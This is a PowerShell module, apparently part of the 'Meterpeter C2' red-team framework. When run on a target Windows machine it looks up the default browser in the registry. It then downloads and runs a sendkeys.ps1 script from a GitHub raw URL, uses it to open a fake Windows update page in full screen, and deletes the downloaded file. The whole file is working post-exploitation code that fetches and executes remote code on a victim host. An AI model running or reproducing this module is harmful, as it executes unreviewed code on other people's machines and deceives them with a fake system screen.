﻿<#
.SYNOPSIS
   Fake Windows Update Prank

   Author: @r00t-3xp10it (ssa redteam)
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.1

.DESCRIPTION
   Auxiliary module of Meterpeter C2 v2.10.13 that executes a prank in background.
   The prank opens the default web browser in fakeupdate.net website in full screen
   mode. To abort the prank target user requires to press {F11} on is keyboard.

.NOTES
   This cmdlet stores windows operative sistem version number, stores default web
   browser name, gets the default browser executable path, selects the operative
   sistem version to run on fakeupdate.net, downloads sendkeys.ps1 cmdlet, execute
   sendkeys cmdlet to open default browser in fakeupdate.net in full windows mode.
   sendkeys cmdlet its invoked to send keyboard keys to the browser [Enter + F11]

.EXAMPLE
   PS C:\> .\FWUprank.ps1

.EXAMPLE
   PS C:\> powershell -file FWUprank.ps1

.INPUTS
   None. You cannot pipe objects into FWUprank.ps1

.OUTPUTS
   * Send Keys to running programs
     + Start and capture process info.
     + Success, sending key: 'https://fakeupdate.net/win11/~{F11}'
     + Process PID: '11864'
   * Exit sendkeys cmdlet execution ..
   
.LINK
   https://github.com/r00t-3xp10it/meterpeter
#>


#Global variable declarations
$ErrorActionPreference = "SilentlyContinue"
$DefaultSettingPath = 'HKCU:\SOFTWARE\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice'
$SendKeyscmdlet = "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/sendkeys.ps1"


#Store operative system version
$OsVersion = [System.Environment]::OSVersion.Version.Major
If([string]::IsNullOrEmpty($OsVersion))
{
   write-host "`n    x" -ForegroundColor Red -NoNewline
   write-host " fail to get operative sistem version number ...`n" -ForegroundColor DarkGray
   return
}

#Store default web browser name
$DefaultBrowserName = (Get-Item -Path "$DefaultSettingPath"|Get-ItemProperty).ProgId
If([string]::IsNullOrEmpty($DefaultBrowserName))
{
   write-host "`n    x" -ForegroundColor Red -NoNewline
   write-host " fail to get default web browser name ...`n" -ForegroundColor DarkGray
   return
}

#Create PSDrive to HKEY_CLASSES_ROOT
$null = New-PSDrive -PSProvider registry -Root 'HKEY_CLASSES_ROOT' -Name 'HKCR'

#Get the default browser executable command/path
$DefaultBrowserOpenCommand = (Get-Item "HKCR:\$DefaultBrowserName\shell\open\command" | Get-ItemProperty).'(default)'
$DefaultBrowserPathSanitize = [regex]::Match($DefaultBrowserOpenCommand,'\".+?\"')
Remove-PSDrive -Name 'HKCR'

If([string]::IsNullOrEmpty($DefaultBrowserPathSanitize))
{
   write-host "`n    x" -ForegroundColor Red -NoNewline
   write-host " fail to get default browser executable command/path...`n" -ForegroundColor DarkGray
   return
}

#Sanitize command
$DefaultBrowserPath = $DefaultBrowserPathSanitize.value -replace '"',''

#Select the OS version to run
If($OsVersion -match '^(xp)$')
{
   $SystemId = "xp"
}
ElseIf($OsVersion -match '^(7)$')
{
   $SystemId = "win7"
}
ElseIf($OsVersion -match '^(10)$')
{
   $SystemId = "win10ue"
}
ElseIf($OsVersion -match '^(11)$')
{
   $SystemId = "win11"
}
Else
{
   $SystemId = "win11"
}

#Download sendkes cmdlet from github
iwr -uri "$SendKeyscmdlet" -OutFile "sendkeys.ps1"
#Execute sendkeys cmdlet to open default browser in fakeupdate.net in full windows mode
.\sendkeys.ps1 -Program "$DefaultBrowserPath" -SendKey "https://fakeupdate.net/$SystemId/~{F11}"

#CleanUp
Remove-Item sendkeys.ps1 -Force
